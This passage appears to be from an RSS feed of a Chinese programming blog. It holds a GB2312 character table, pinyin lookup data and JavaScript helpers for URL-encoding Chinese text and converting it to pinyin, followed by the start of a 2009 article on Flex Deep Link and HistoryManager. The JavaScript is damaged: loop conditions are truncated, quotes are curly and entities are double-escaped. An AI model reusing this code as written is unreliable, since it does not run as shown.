靡糜迷谜弥米秘觅泌蜜密幂棉眠绵冕免勉娩缅面苗描瞄藐秒渺庙妙蔑灭民抿皿敏悯闽明螟鸣铭名命谬摸摹蘑模膜磨摩魔抹末莫墨默沫漠寞陌谋牟某拇牡亩姆母墓暮幕募慕木目睦牧穆拿哪呐钠那娜纳氖乃奶耐奈南男难囊挠脑恼闹淖呢馁内嫩能妮霓倪泥尼拟你匿腻逆溺蔫拈年碾撵捻念娘酿鸟尿捏聂孽啮镊镍涅您柠狞凝宁拧泞牛扭钮纽脓浓农弄奴努怒女暖虐疟挪懦糯诺哦欧鸥殴藕呕偶沤啪趴爬帕怕琶拍排牌徘湃派攀潘盘磐盼畔判叛乓庞旁耪胖抛咆刨炮袍跑泡呸胚培裴赔陪配佩沛喷盆砰抨烹澎彭蓬棚硼篷膨朋鹏捧碰坯砒霹批披劈琵毗啤脾疲皮匹痞僻屁譬篇偏片骗飘漂瓢票撇瞥拼频贫品聘乒坪苹萍平凭瓶评屏坡泼颇婆破魄迫粕剖扑铺仆莆葡菩蒲埔朴圃普浦谱曝瀑期欺栖戚妻七凄漆柒沏其棋奇歧畦崎脐齐旗祈祁骑起岂乞企启契砌器气迄弃汽泣讫掐恰洽牵扦钎铅千迁签仟谦乾黔钱钳前潜遣浅谴堑嵌欠歉枪呛腔羌墙蔷强抢橇锹敲悄桥瞧乔侨巧鞘撬翘峭俏窍切茄且怯窃钦侵亲秦琴勤芹擒禽寝沁青轻氢倾卿清擎晴氰情顷请庆琼穷秋丘邱球求囚酋泅趋区蛆曲躯屈驱渠取娶龋趣去圈颧权醛泉全痊拳犬券劝缺炔瘸却鹊榷确雀裙群然燃冉染瓤壤攘嚷让饶扰绕惹热壬仁人忍韧任认刃妊纫扔仍日戎茸蓉荣融熔溶容绒冗揉柔肉茹蠕儒孺如辱乳汝入褥软阮蕊瑞锐闰润若弱撒洒萨腮鳃塞赛三叁伞散桑嗓丧搔骚扫嫂瑟色涩森僧莎砂杀刹沙纱傻啥煞筛晒珊苫杉山删煽衫闪陕擅赡膳善汕扇缮墒伤商赏晌上尚裳梢捎稍烧芍勺韶少哨邵绍奢赊蛇舌舍赦摄射慑涉社设砷申呻伸身深娠绅神沈审婶甚肾慎渗声生甥牲升绳省盛剩胜圣师失狮施湿诗尸虱十石拾时什食蚀实识史矢使屎驶始式示士世柿事拭誓逝势是嗜噬适仕侍释饰氏市恃室视试收手首守寿授售受瘦兽蔬枢梳殊抒输叔舒淑疏书赎孰熟薯暑曙署蜀黍鼠属术述树束戍竖墅庶数漱恕刷耍摔衰甩帅栓拴霜双爽谁水睡税吮瞬顺舜说硕朔烁斯撕嘶思私司丝死肆寺嗣四伺似饲巳松耸怂颂送宋讼诵搜艘擞嗽苏酥俗素速粟僳塑溯宿诉肃酸蒜算虽隋随绥髓碎岁穗遂隧祟孙损笋蓑梭唆缩琐索锁所塌他它她塔獭挞蹋踏胎苔抬台泰酞太态汰坍摊贪瘫滩坛檀痰潭谭谈坦毯袒碳探叹炭汤塘搪堂棠膛唐糖倘躺淌趟烫掏涛滔绦萄桃逃淘陶讨套特藤腾疼誊梯剔踢锑提题蹄啼体替嚏惕涕剃屉天添填田甜恬舔腆挑条迢眺跳贴铁帖厅听烃汀廷停亭庭挺艇通桐酮瞳同铜彤童桶捅筒统痛偷投头透凸秃突图徒途涂屠土吐兔湍团推颓腿蜕褪退吞屯臀拖托脱鸵陀驮驼椭妥拓唾挖哇蛙洼娃瓦袜歪外豌弯湾玩顽丸烷完碗挽晚皖惋宛婉万腕汪王亡枉网往旺望忘妄威巍微危韦违桅围唯惟为潍维苇萎委伟伪尾纬未蔚味畏胃喂魏位渭谓尉慰卫瘟温蚊文闻纹吻稳紊问嗡翁瓮挝蜗涡窝我斡卧握沃巫呜钨乌污诬屋无芜梧吾吴毋武五捂午舞伍侮坞戊雾晤物勿务悟误昔熙析西硒矽晰嘻吸锡牺稀息希悉膝夕惜熄烯溪汐犀檄袭席习媳喜铣洗系隙戏细瞎虾匣霞辖暇峡侠狭下厦夏吓掀锨先仙鲜纤咸贤衔舷闲涎弦嫌显险现献县腺馅羡宪陷限线相厢镶香箱襄湘乡翔祥详想响享项巷橡像向象萧硝霄削哮嚣销消宵淆晓小孝校肖啸笑效楔些歇蝎鞋协挟携邪斜胁谐写械卸蟹懈泄泻谢屑薪芯锌欣辛新忻心信衅星腥猩惺兴刑型形邢行醒幸杏性姓兄凶胸匈汹雄熊休修羞朽嗅锈秀袖绣墟戌需虚嘘须徐许蓄酗叙旭序畜恤絮婿绪续轩喧宣悬旋玄选癣眩绚靴薛学穴雪血勋熏循旬询寻驯巡殉汛训讯逊迅压押鸦鸭呀丫芽牙蚜崖衙涯雅哑亚讶焉咽阉烟淹盐严研蜒岩延言颜阎炎沿奄掩眼衍演艳堰燕厌砚雁唁彦焰宴谚验殃央鸯秧杨扬佯疡羊洋阳氧仰痒养样漾邀腰妖瑶摇尧遥窑谣姚咬舀药要耀椰噎耶爷野冶也页掖业叶曳腋夜液一壹医揖铱依伊衣颐夷遗移仪胰疑沂宜姨彝椅蚁倚已乙矣以艺抑易邑屹亿役臆逸肄疫亦裔意毅忆义益溢诣议谊译异翼翌绎茵荫因殷音阴姻吟银淫寅饮尹引隐印英樱婴鹰应缨莹萤营荧蝇迎赢盈影颖硬映哟拥佣臃痈庸雍踊蛹咏泳涌永恿勇用幽优悠忧尤由邮铀犹油游酉有友右佑釉诱又幼迂淤于盂榆虞愚舆余俞逾鱼愉渝渔隅予娱雨与屿禹宇语羽玉域芋郁吁遇喻峪御愈欲狱育誉浴寓裕预豫驭鸳渊冤元垣袁原援辕园员圆猿源缘远苑愿怨院曰约越跃钥岳粤月悦阅耘云郧匀陨允运蕴酝晕韵孕匝砸杂栽哉灾宰载再在咱攒暂赞赃脏葬遭糟凿藻枣早澡蚤躁噪造皂灶燥责择则泽贼怎增憎曾赠扎喳渣札轧铡闸眨栅榨咋乍炸诈摘斋宅窄债寨瞻毡詹粘沾盏斩辗崭展蘸栈占战站湛绽樟章彰漳张掌涨杖丈帐账仗胀瘴障招昭找沼赵照罩兆肇召遮折哲蛰辙者锗蔗这浙珍斟真甄砧臻贞针侦枕疹诊震振镇阵蒸挣睁征狰争怔整拯正政帧症郑证芝枝支吱蜘知肢脂汁之织职直植殖执值侄址指止趾只旨纸志挚掷至致置帜峙制智秩稚质炙痔滞治窒中盅忠钟衷终种肿重仲众舟周州洲诌粥轴肘帚咒皱宙昼骤珠株蛛朱猪诸诛逐竹烛煮拄瞩嘱主著柱助蛀贮铸筑住注祝驻抓爪拽专砖转撰赚篆桩庄装妆撞壮状椎锥追赘坠缀谆准捉拙卓桌琢茁酌啄着灼浊兹咨资姿滋淄孜紫仔籽滓子自渍字鬃棕踪宗综总纵邹走奏揍租足卒族祖诅阻组钻纂嘴醉最罪尊遵昨左佐柞做作坐座亍丌兀丐廿卅丕亘丞鬲孬噩丨禺丿匕乇夭爻卮氐囟胤馗毓睾鼗丶亟鼐乜乩亓芈孛啬嘏仄厍厝厣厥厮靥赝匚叵匦匮匾赜卦卣刂刈刎刭刳刿剀剌剞剡剜蒯剽劂劁劐劓冂罔亻仃仉仂仨仡仫仞伛仳伢佤仵伥伧伉伫佞佧攸佚佝佟佗伲伽佶佴侑侉侃侏佾佻侪佼侬侔俦俨俪俅俚俣俜俑俟俸倩偌俳倬倏倮倭俾倜倌倥倨偾偃偕偈偎偬偻傥傧傩傺僖儆僭僬僦僮儇儋仝氽佘佥俎龠汆籴兮巽黉馘冁夔勹匍訇匐凫夙兕亠兖亳衮袤亵脔裒禀嬴蠃羸冫冱冽冼凇冖冢冥讠讦讧讪讴讵讷诂诃诋诏诎诒诓诔诖诘诙诜诟诠诤诨诩诮诰诳诶诹诼诿谀谂谄谇谌谏谑谒谔谕谖谙谛谘谝谟谠谡谥谧谪谫谮谯谲谳谵谶卩卺阝阢阡阱阪阽阼陂陉陔陟陧陬陲陴隈隍隗隰邗邛邝邙邬邡邴邳邶邺邸邰郏郅邾郐郄郇郓郦郢郜郗郛郫郯郾鄄鄢鄞鄣鄱鄯鄹酃酆刍奂劢劬劭劾哿勐勖勰叟燮矍廴凵凼鬯厶弁畚巯坌垩垡塾墼壅壑圩圬圪圳圹圮圯坜圻坂坩垅坫垆坼坻坨坭坶坳垭垤垌垲埏垧垴垓垠埕埘埚埙埒垸埴埯埸埤埝堋堍埽埭堀堞堙塄堠塥塬墁墉墚墀馨鼙懿艹艽艿芏芊芨芄芎芑芗芙芫芸芾芰苈苊苣芘芷芮苋苌苁芩芴芡芪芟苄苎芤苡茉苷苤茏茇苜苴苒苘茌苻苓茑茚茆茔茕苠苕茜荑荛荜茈莒茼茴茱莛荞茯荏荇荃荟荀茗荠茭茺茳荦荥荨茛荩荬荪荭荮莰荸莳莴莠莪莓莜莅荼莶莩荽莸荻莘莞莨莺莼菁萁菥菘堇萘萋菝菽菖萜萸萑萆菔菟萏萃菸菹菪菅菀萦菰菡葜葑葚葙葳蒇蒈葺蒉葸萼葆葩葶蒌蒎萱葭蓁蓍蓐蓦蒽蓓蓊蒿蒺蓠蒡蒹蒴蒗蓥蓣蔌甍蔸蓰蔹蔟蔺蕖蔻蓿蓼蕙蕈蕨蕤蕞蕺瞢蕃蕲蕻薤薨薇薏蕹薮薜薅薹薷薰藓藁藜藿蘧蘅蘩蘖蘼廾弈夼奁耷奕奚奘匏尢尥尬尴扌扪抟抻拊拚拗拮挢拶挹捋捃掭揶捱捺掎掴捭掬掊捩掮掼揲揸揠揿揄揞揎摒揆掾摅摁搋搛搠搌搦搡摞撄摭撖摺撷撸撙撺擀擐擗擤擢攉攥攮弋忒甙弑卟叱叽叩叨叻吒吖吆呋呒呓呔呖呃吡呗呙吣吲咂咔呷呱呤咚咛咄呶呦咝哐咭哂咴哒咧咦哓哔呲咣哕咻咿哌哙哚哜咩咪咤哝哏哞唛哧唠哽唔哳唢唣唏唑唧唪啧喏喵啉啭啁啕唿啐唼唷啖啵啶啷唳唰啜喋嗒喃喱喹喈喁喟啾嗖喑啻嗟喽喾喔喙嗪嗷嗉嘟嗑嗫嗬嗔嗦嗝嗄嗯嗥嗲嗳嗌嗍嗨嗵嗤辔嘞嘈嘌嘁嘤嘣嗾嘀嘧嘭噘嘹噗嘬噍噢噙噜噌噔嚆噤噱噫噻噼嚅嚓嚯囔囗囝囡囵囫囹囿圄圊圉圜帏帙帔帑帱帻帼帷幄幔幛幞幡岌屺岍岐岖岈岘岙岑岚岜岵岢岽岬岫岱岣峁岷峄峒峤峋峥崂崃崧崦崮崤崞崆崛嵘崾崴崽嵬嵛嵯嵝嵫嵋嵊嵩嵴嶂嶙嶝豳嶷巅彳彷徂徇徉後徕徙徜徨徭徵徼衢彡犭犰犴犷犸狃狁狎狍狒狨狯狩狲狴狷猁狳猃狺狻猗猓猡猊猞猝猕猢猹猥猬猸猱獐獍獗獠獬獯獾舛夥飧夤夂饣饧饨饩饪饫饬饴饷饽馀馄馇馊馍馐馑馓馔馕庀庑庋庖庥庠庹庵庾庳赓廒廑廛廨廪膺忄忉忖忏怃忮怄忡忤忾怅怆忪忭忸怙怵怦怛怏怍怩怫怊怿怡恸恹恻恺恂恪恽悖悚悭悝悃悒悌悛惬悻悱惝惘惆惚悴愠愦愕愣惴愀愎愫慊慵憬憔憧憷懔懵忝隳闩闫闱闳闵闶闼闾阃阄阆阈阊阋阌阍阏阒阕阖阗阙阚丬爿戕氵汔汜汊沣沅沐沔沌汨汩汴汶沆沩泐泔沭泷泸泱泗沲泠泖泺泫泮沱泓泯泾洹洧洌浃浈洇洄洙洎洫浍洮洵洚浏浒浔洳涑浯涞涠浞涓涔浜浠浼浣渚淇淅淞渎涿淠渑淦淝淙渖涫渌涮渫湮湎湫溲湟溆湓湔渲渥湄滟溱溘滠漭滢溥溧溽溻溷滗溴滏溏滂溟潢潆潇漤漕滹漯漶潋潴漪漉漩澉澍澌潸潲潼潺濑濉澧澹澶濂濡濮濞濠濯瀚瀣瀛瀹瀵灏灞宀宄宕宓宥宸甯骞搴寤寮褰寰蹇謇辶迓迕迥迮迤迩迦迳迨逅逄逋逦逑逍逖逡逵逶逭逯遄遑遒遐遨遘遢遛暹遴遽邂邈邃邋彐彗彖彘尻咫屐屙孱屣屦羼弪弩弭艴弼鬻屮妁妃妍妩妪妣妗姊妫妞妤姒妲妯姗妾娅娆姝娈姣姘姹娌娉娲娴娑娣娓婀婧婊婕娼婢婵胬媪媛婷婺媾嫫媲嫒嫔媸嫠嫣嫱嫖嫦嫘嫜嬉嬗嬖嬲嬷孀尕尜孚孥孳孑孓孢驵驷驸驺驿驽骀骁骅骈骊骐骒骓骖骘骛骜骝骟骠骢骣骥骧纟纡纣纥纨纩纭纰纾绀绁绂绉绋绌绐绔绗绛绠绡绨绫绮绯绱绲缍绶绺绻绾缁缂缃缇缈缋缌缏缑缒缗缙缜缛缟缡缢缣缤缥缦缧缪缫缬缭缯缰缱缲缳缵幺畿巛甾邕玎玑玮玢玟珏珂珑玷玳珀珉珈珥珙顼琊珩珧珞玺珲琏琪瑛琦琥琨琰琮琬琛琚瑁瑜瑗瑕瑙瑷瑭瑾璜璎璀璁璇璋璞璨璩璐璧瓒璺韪韫韬杌杓杞杈杩枥枇杪杳枘枧杵枨枞枭枋杷杼柰栉柘栊柩枰栌柙枵柚枳柝栀柃枸柢栎柁柽栲栳桠桡桎桢桄桤梃栝桕桦桁桧桀栾桊桉栩梵梏桴桷梓桫棂楮棼椟椠棹椤棰椋椁楗棣椐楱椹楠楂楝榄楫榀榘楸椴槌榇榈槎榉楦楣楹榛榧榻榫榭槔榱槁槊槟榕槠榍槿樯槭樗樘橥槲橄樾檠橐橛樵檎橹樽樨橘橼檑檐檩檗檫猷獒殁殂殇殄殒殓殍殚殛殡殪轫轭轱轲轳轵轶轸轷轹轺轼轾辁辂辄辇辋辍辎辏辘辚軎戋戗戛戟戢戡戥戤戬臧瓯瓴瓿甏甑甓攴旮旯旰昊昙杲昃昕昀炅曷昝昴昱昶昵耆晟晔晁晏晖晡晗晷暄暌暧暝暾曛曜曦曩贲贳贶贻贽赀赅赆赈赉赇赍赕赙觇觊觋觌觎觏觐觑牮犟牝牦牯牾牿犄犋犍犏犒挈挲掰搿擘耄毪毳毽毵毹氅氇氆氍氕氘氙氚氡氩氤氪氲攵敕敫牍牒牖爰虢刖肟肜肓肼朊肽肱肫肭肴肷胧胨胩胪胛胂胄胙胍胗朐胝胫胱胴胭脍脎胲胼朕脒豚脶脞脬脘脲腈腌腓腴腙腚腱腠腩腼腽腭腧塍媵膈膂膑滕膣膪臌朦臊膻臁膦欤欷欹歃歆歙飑飒飓飕飙飚殳彀毂觳斐齑斓於旆旄旃旌旎旒旖炀炜炖炝炻烀炷炫炱烨烊焐焓焖焯焱煳煜煨煅煲煊煸煺熘熳熵熨熠燠燔燧燹爝爨灬焘煦熹戾戽扃扈扉礻祀祆祉祛祜祓祚祢祗祠祯祧祺禅禊禚禧禳忑忐怼恝恚恧恁恙恣悫愆愍慝憩憝懋懑戆肀聿沓泶淼矶矸砀砉砗砘砑斫砭砜砝砹砺砻砟砼砥砬砣砩硎硭硖硗砦硐硇硌硪碛碓碚碇碜碡碣碲碹碥磔磙磉磬磲礅磴礓礤礞礴龛黹黻黼盱眄眍盹眇眈眚眢眙眭眦眵眸睐睑睇睃睚睨睢睥睿瞍睽瞀瞌瞑瞟瞠瞰瞵瞽町畀畎畋畈畛畲畹疃罘罡罟詈罨罴罱罹羁罾盍盥蠲钅钆钇钋钊钌钍钏钐钔钗钕钚钛钜钣钤钫钪钭钬钯钰钲钴钶钷钸钹钺钼钽钿铄铈铉铊铋铌铍铎铐铑铒铕铖铗铙铘铛铞铟铠铢铤铥铧铨铪铩铫铮铯铳铴铵铷铹铼铽铿锃锂锆锇锉锊锍锎锏锒锓锔锕锖锘锛锝锞锟锢锪锫锩锬锱锲锴锶锷锸锼锾锿镂锵镄镅镆镉镌镎镏镒镓镔镖镗镘镙镛镞镟镝镡镢镤镥镦镧镨镩镪镫镬镯镱镲镳锺矧矬雉秕秭秣秫稆嵇稃稂稞稔稹稷穑黏馥穰皈皎皓皙皤瓞瓠甬鸠鸢鸨鸩鸪鸫鸬鸲鸱鸶鸸鸷鸹鸺鸾鹁鹂鹄鹆鹇鹈鹉鹋鹌鹎鹑鹕鹗鹚鹛鹜鹞鹣鹦鹧鹨鹩鹪鹫鹬鹱鹭鹳疒疔疖疠疝疬疣疳疴疸痄疱疰痃痂痖痍痣痨痦痤痫痧瘃痱痼痿瘐瘀瘅瘌瘗瘊瘥瘘瘕瘙瘛瘼瘢瘠癀瘭瘰瘿瘵癃瘾瘳癍癞癔癜癖癫癯翊竦穸穹窀窆窈窕窦窠窬窨窭窳衤衩衲衽衿袂袢裆袷袼裉裢裎裣裥裱褚裼裨裾裰褡褙褓褛褊褴褫褶襁襦襻疋胥皲皴矜耒耔耖耜耠耢耥耦耧耩耨耱耋耵聃聆聍聒聩聱覃顸颀颃颉颌颍颏颔颚颛颞颟颡颢颥颦虍虔虬虮虿虺虼虻蚨蚍蚋蚬蚝蚧蚣蚪蚓蚩蚶蛄蚵蛎蚰蚺蚱蚯蛉蛏蚴蛩蛱蛲蛭蛳蛐蜓蛞蛴蛟蛘蛑蜃蜇蛸蜈蜊蜍蜉蜣蜻蜞蜥蜮蜚蜾蝈蜴蜱蜩蜷蜿螂蜢蝽蝾蝻蝠蝰蝌蝮螋蝓蝣蝼蝤蝙蝥螓螯螨蟒蟆螈螅螭螗螃螫蟥螬螵螳蟋蟓螽蟑蟀蟊蟛蟪蟠蟮蠖蠓蟾蠊蠛蠡蠹蠼缶罂罄罅舐竺竽笈笃笄笕笊笫笏筇笸笪笙笮笱笠笥笤笳笾笞筘筚筅筵筌筝筠筮筻筢筲筱箐箦箧箸箬箝箨箅箪箜箢箫箴篑篁篌篝篚篥篦篪簌篾篼簏簖簋簟簪簦簸籁籀臾舁舂舄臬衄舡舢舣舭舯舨舫舸舻舳舴舾艄艉艋艏艚艟艨衾袅袈裘裟襞羝羟羧羯羰羲籼敉粑粝粜粞粢粲粼粽糁糇糌糍糈糅糗糨艮暨羿翎翕翥翡翦翩翮翳糸絷綦綮繇纛麸麴赳趄趔趑趱赧赭豇豉酊酐酎酏酤酢酡酰酩酯酽酾酲酴酹醌醅醐醍醑醢醣醪醭醮醯醵醴醺豕鹾趸跫踅蹙蹩趵趿趼趺跄跖跗跚跞跎跏跛跆跬跷跸跣跹跻跤踉跽踔踝踟踬踮踣踯踺蹀踹踵踽踱蹉蹁蹂蹑蹒蹊蹰蹶蹼蹯蹴躅躏躔躐躜躞豸貂貊貅貘貔斛觖觞觚觜觥觫觯訾謦靓雩雳雯霆霁霈霏霎霪霭霰霾龀龃龅龆龇龈龉龊龌黾鼋鼍隹隼隽雎雒瞿雠銎銮鋈錾鍪鏊鎏鐾鑫鱿鲂鲅鲆鲇鲈稣鲋鲎鲐鲑鲒鲔鲕鲚鲛鲞鲟鲠鲡鲢鲣鲥鲦鲧鲨鲩鲫鲭鲮鲰鲱鲲鲳鲴鲵鲶鲷鲺鲻鲼鲽鳄鳅鳆鳇鳊鳋鳌鳍鳎鳏鳐鳓鳔鳕鳗鳘鳙鳜鳝鳟鳢靼鞅鞑鞒鞔鞯鞫鞣鞲鞴骱骰骷鹘骶骺骼髁髀髅髂髋髌髑魅魃魇魉魈魍魑飨餍餮饕饔髟髡髦髯髫髻髭髹鬈鬏鬓鬟鬣麽麾縻麂麇麈麋麒鏖麝麟黛黜黝黠黟黢黩黧黥黪黯鼢鼬鼯鼹鼷鼽鼾齄”;&#xA;var qswhSpell=[“a”,0,”ai”,2,”an”,15,”ang”,24,”ao”,27,”ba”,36,”bai”,54,”ban”,62,”bang”,77,”bao”,89,”bei”,106,”ben”,121,”beng”,125,”bi”,131,”bian”,155,”biao”,167,”bie”,171,”bin”,175,”bing”,181,”bo”,190,”bu”,211,”ca”,220,”cai”,221,”can”,232,”cang”,239,”cao”,244,”ce”,249,”ceng”,254,”cha”,256,”chai”,267,”chan”,270,”chang”,280,”chao”,293,”che”,302,”chen”,308,”cheng”,318,”chi”,333,”chong”,349,”chou”,354,”chu”,366,”chuai”,382,”chuan”,383,”chuang”,390,”chui”,396,”chun”,401,”chuo”,408,”ci”,410,”cong”,422,”cou”,428,”cu”,429,”cuan”,433,”cui”,436,”cun”,444,”cuo”,447,”da”,453,”dai”,459,”dan”,471,”dang”,486,”dao”,491,”de”,503,”deng”,506,”di”,513,”dian”,532,”diao”,548,”die”,557,”ding”,564,”diu”,573,”dong”,574,”dou”,584,”du”,591,”duan”,606,”dui”,612,”dun”,616,”duo”,625,”e”,637,”en”,650,”er”,651,”fa”,659,”fan”,667,”fang”,684,”fei”,695,”fen”,707,”feng”,722,”fo”,737,”fou”,738,”fu”,739,”ga”,784,”gai”,786,”gan”,792,”gang”,803,”gao”,812,”ge”,822,”gei”,839,”gen”,840,”geng”,842,”gong”,849,”gou”,864,”gu”,873,”gua”,891,”guai”,897,”guan”,900,”guang”,911,”gui”,914,”gun”,930,”guo”,933,”ha”,939,”hai”,940,”han”,947,”hang”,966,”hao”,969,”he”,978,”hei”,996,”hen”,998,”heng”,1002,”hong”,1007,”hou”,1016,”hu”,1023,”hua”,1041,”huai”,1050,”huan”,1055,”huang”,1069,”hui”,1083,”hun”,1104,”huo”,1110,”ji”,1120,”jia”,1173,”jian”,1190,”jiang”,1230,”jiao”,1243,”jie”,1271,”jin”,1298,”jing”,1318,”jiong”,1343,”jiu”,1345,”ju”,1362,”juan”,1387,”jue”,1394,”jun”,1404,”ka”,1415,”kai”,1419,”kan”,1424,”kang”,1430,”kao”,1437,”ke”,1441,”ken”,1456,”keng”,1460,”kong”,1462,”kou”,1466,”ku”,1470,”kua”,1477,”kuai”,1482,”kuan”,1486,”kuang”,1488,”kui”,1496,”kun”,1507,”kuo”,1511,”la”,1515,”lai”,1522,”lan”,1525,”lang”,1540,”lao”,1547,”le”,1556,”lei”,1558,”leng”,1569,”li”,1572,”lia”,1606,”lian”,1607,”liang”,1621,”liao”,1632,”lie”,1645,”lin”,1650,”ling”,1662,”liu”,1676,”long”,1687,”lou”,1696,”lu”,1702,”lv”,1722,”luan”,1736,”lue”,1742,”lun”,1744,”luo”,1751,”ma”,1763,”mai”,1772,”man”,1778,”mang”,1787,”mao”,1793,”me”,1805,”mei”,1806,”men”,1822,”meng”,1825,”mi”,1833,”mian”,1847,”miao”,1856,”mie”,1864,”min”,1866,”ming”,1872,”miu”,1878,”mo”,1879,”mou”,1896,”mu”,1899,”na”,1914,”nai”,1921,”nan”,1926,”nang”,1929,”nao”,1930,”ne”,1935,”nei”,1936,”nen”,1938,”neng”,1939,”ni”,1940,”nian”,1951,”niang”,1958,”niao”,1960,”nie”,1962,”nin”,1969,”ning”,1970,”niu”,1976,”nong”,1980,”nu”,1984,”nv”,1987,”nuan”,1988,”nue”,1989,”nuo”,1991,”o”,1995,”ou”,1996,”pa”,2003,”pai”,2009,”pan”,2015,”pang”,2023,”pao”,2028,”pei”,2035,”pen”,2044,”peng”,2046,”pi”,2060,”pian”,2077,”piao”,2081,”pie”,2085,”pin”,2087,”ping”,2092,”po”,2101,”pu”,2110,”qi”,2125,”qia”,2161,”qian”,2164,”qiang”,2186,”qiao”,2194,”qie”,2209,”qin”,2214,”qing”,2225,”qiong”,2238,”qiu”,2240,”qu”,2248,”quan”,2261,”que”,2272,”qun”,2280,”ran”,2282,”rang”,2286,”rao”,2291,”re”,2294,”ren”,2296,”reng”,2306,”ri”,2308,”rong”,2309,”rou”,2319,”ru”,2322,”ruan”,2332,”rui”,2334,”run”,2337,”ruo”,2339,”sa”,2341,”sai”,2344,”san”,2348,”sang”,2352,”sao”,2355,”se”,2359,”sen”,2362,”seng”,2363,”sha”,2364,”shai”,2373,”shan”,2375,”shang”,2391,”shao”,2399,”she”,2410,”shen”,2422,”sheng”,2438,”shi”,2449,”shou”,2496,”shu”,2506,”shua”,2539,”shuai”,2541,”shuan”,2545,”shuang”,2547,”shui”,2550,”shun”,2554,”shuo”,2558,”si”,2562,”song”,2578,”sou”,2586,”su”,2589,”suan”,2602,”sui”,2605,”sun”,2616,”suo”,2619,”ta”,2627,”tai”,2636,”tan”,2645,”tang”,2663,”tao”,2676,”te”,2687,”teng”,2688,”ti”,2692,”tian”,2707,”tiao”,2715,”tie”,2720,”ting”,2723,”tong”,2733,”tou”,2746,”tu”,2750,”tuan”,2761,”tui”,2763,”tun”,2769,”tuo”,2772,”wa”,2783,”wai”,2790,”wan”,2792,”wang”,2809,”wei”,2819,”wen”,2852,”weng”,2862,”wo”,2865,”wu”,2874,”xi”,2903,”xia”,2938,”xian”,2951,”xiang”,2977,”xiao”,2997,”xie”,3015,”xin”,3036,”xing”,3046,”xiong”,3061,”xiu”,3068,”xu”,3077,”xuan”,3096,”xue”,3106,”xun”,3112,”ya”,3126,”yan”,3142,”yang”,3175,”yao”,3192,”ye”,3207,”yi”,3222,”yin”,3275,”ying”,3291,”yo”,3309,”yong”,3310,”you”,3325,”yu”,3346,”yuan”,3390,”yue”,3410,”yun”,3420,”za”,3432,”zai”,3435,”zan”,3442,”zang”,3446,”zao”,3449,”ze”,3463,”zei”,3467,”zen”,3468,”zeng”,3469,”zha”,3473,”zhai”,3487,”zhan”,3493,”zhang”,3510,”zhao”,3525,”zhe”,3535,”zhen”,3545,”zheng”,3561,”zhi”,3576,”zhong”,3619,”zhou”,3630,”zhu”,3644,”zhua”,3670,”zhuai”,3672,”zhuan”,3673,”zhuang”,3679,”zhui”,3686,”zhun”,3692,”zhuo”,3694,”zi”,3705,”zong”,3720,”zou”,3727,”zu”,3731,”zuan”,3739,”zui”,3741,”zun”,3745,”zuo”,3747];&#xA;function UrlEncode(str){&#xA;var i,c,p,q,ret=””,strSpecial=”!/”#$%&amp;amp;&#39;()*+,/:;&amp;lt;=&amp;gt;?@[/]^`{|}~%”;&#xA;for(i=0;i if(str.charCodeAt(i)&amp;gt;=0x4e00){&#xA;var p=strGB.indexOf(str.charAt(i));&#xA;if(p&amp;gt;=0){&#xA;q=p%94;&#xA;p=(p-q)/94;&#xA;ret+=(“%”+(0xB0+p).toString(16)+”%”+(0xA1+q).toString(16)).toUpperCase();&#xA;}&#xA;}&#xA;else{&#xA;c=str.charAt(i);&#xA;if(c==” “)&#xA;ret+=”+”;&#xA;else if(strSpecial.indexOf(c)!=-1)&#xA;ret+=”%”+str.charCodeAt(i).toString(16);&#xA;else&#xA;ret+=c;&#xA;}&#xA;}&#xA;return ret;&#xA;}&#xA;function getSpell(str,sp){&#xA;var i,c,t,p,ret=””;&#xA;if(sp==null)sp=””;&#xA;for(i=0;i if(str.charCodeAt(i)&amp;gt;=0x4e00){&#xA;p=strGB.indexOf(str.charAt(i));&#xA;if(p&amp;gt;-1&amp;amp;&amp;amp;p&amp;lt;3755){&#xA;for(t=qswhSpell.length-1;t&amp;gt;0;t=t-2)if(qswhSpell[t]&amp;lt;=p)break;&#xA;if(t&amp;gt;0)ret+=qswhSpell[t-1]+sp;&#xA;}&#xA;}&#xA;}&#xA;return ret.substr(0,ret.length-sp.length);&#xA;}&#xA;var sel=””,timer=null;&#xA;function spellList(){&#xA;with(window.event){&#xA;with(srcElement){&#xA;if(keyCode&amp;lt;48)return;&#xA;if(keyCode&amp;gt;95)keyCode-=48&#xA;sel+=String.fromCharCode(keyCode);//统计键盘输入&#xA;window.status=sel;&#xA;var cm=[],xm=0;&#xA;for(i=0;i if(!options[i].sp){&#xA;var tmp=””;&#xA;var arr = [];</description>
    </item>
    <item>
      <title>Flex Deep Link(深链接)应用</title>
      <link>https://anwangtanmi.github.io/posts/312afdbb8cffa29450ec5d5b4bc91057/</link>
      <pubDate>Sun, 22 Feb 2009 19:14:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/312afdbb8cffa29450ec5d5b4bc91057/</guid>
      <description>Flex Deep Link(深链接)应用&#xA;最近做游戏的时候，发现退出登陆时URL上会自动加上一个“#”字符，很奇怪，Google+Baidu无数次都没有找到答案。今天无意间看到几个群友在说通过“BrowserManager”获取URL，于是仔细查看了API，又发现了“HistoryManager”，这个问题终于明白了。&#xA;我们通常看的Web页面 可以通过浏览器的“前进”“后退”来查看刚才看过的页面，同样，嵌入的页面中的flash也可以实现这样的功能。方法是通过HistoryManageer类和BrowserManager类两种方法来实现。HistoryManageer类主要是用在Flex2，Flex3后很少用了。待会我将分别介绍这两种方法。&#xA;回到刚才说URL上自动加“#”号的问题：原因是Application 默认historyManagementEnabled属性是ture，也就是说HistoryManageer类功能自动开启了，Application 里面通过程序控制addChild或removeChild任何组件所导致的变化，将会记录在flash的history中，导致重写url，加上“#”字符。故有了这个奇怪的“#”号。在Flex3中，HistoryManager功能在Flex项目中默认打开的还有Accordion 和 TabNavigator组件。对于没有默认打开该功能的组件，如果要实现该功能，则需要另外注册。下面引用两片文章加以说明：&#xA;对于一个网站来说，其是有若干个网页组成的。而各个网页之间的链接叫做超链接。链接成为网页和网页之间的桥梁。那么，对于一个Flash整站来说，有没有一个办法来实现Flash各页面（更恰当的说是各功能模块）之间的链接呢。比如，我想在浏览器中输入一个链接便可以链到Flash整站中的一页—一个功能模块，而不是每次都要通过Flash整站的第一个页面的功能导航进入。把Flash的各个功能块页面化，那么我们该怎么实现呢。到底能不能实现呢？ 答案是肯定的，通过Flex Deep Link 便能实现上述功能。 第一，Deep Link 简介。 Deep Link其实也是依赖Flash和浏览器的交互来实现的，通过获取链接地址中#后面的参数来实现页面标记，当你在Flex Bulid3发布一个项目时，其会自动你发布的目录生成一个名为History的文件夹，里面有History.js,HistoryFrame.html,history.css这三个文件，可见Deep 